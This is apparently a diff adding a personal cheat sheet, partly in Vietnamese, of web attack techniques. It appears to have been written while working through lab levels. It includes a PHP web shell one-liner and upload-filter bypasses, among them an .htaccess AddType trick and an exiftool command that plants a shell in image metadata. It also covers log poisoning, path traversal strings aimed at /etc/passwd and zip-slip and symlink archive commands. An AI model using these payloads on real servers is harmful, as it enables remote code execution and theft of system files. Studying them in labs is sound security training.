@@ -1,0 +1,38 @@
+<?php system($_GET['cmd']);?>
+abc.php.php
+chạy các file cùng đuôi khác phar,phtml,...
+.htaccess(<2.3.9):      AddType application/x-httpd-php .txt    
+change file type
+change file signature 
+exiftool -Comment="<?php system($_GET['cmd']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+inject php to log file
+by change user-agent; referer   requestline
+
+/proc/   chứa info process đang chạy
+/proc/self/environ     là file symlink ảo trỏ tới thư mục của process hiện tại ( process đang excec)
+
+tạo ra vòng lặp vô hạn bằng cách thay đổi para từ url từ string -> obj
+test?guess[length]=9999999999999999999 
+
+
+path traversal
+encode 1 or 2 url
+..../..../..../
+...//...//
+../../../../etc/passwd%001.png
+ls%09%%32%66  ls /       2.4.5<apache
+include "http/example"
+level 4: upload a file and use the patth traversal access to that file
+level 5: inject to access.log
+mở burp suite để xem những file có đường dẫn bị ẩn đi như img 
+pwd  --->   cd email
+https://www.thegeekstuff.com/2008/10/6-awesome-linux-cd-command-hacks-productivity-tip3-for-geeks/
+
+untrusted data  rơi vào những hàm xử lý đường dẫn
+impact: thao túng file path
+
+python evilarc.py -d 2 -o unix hack.txt
+ln -s originfile  newfile
+zip -r --symlinks demo.zip symlinkfile
+zip -y demo.zip symlinkfile 
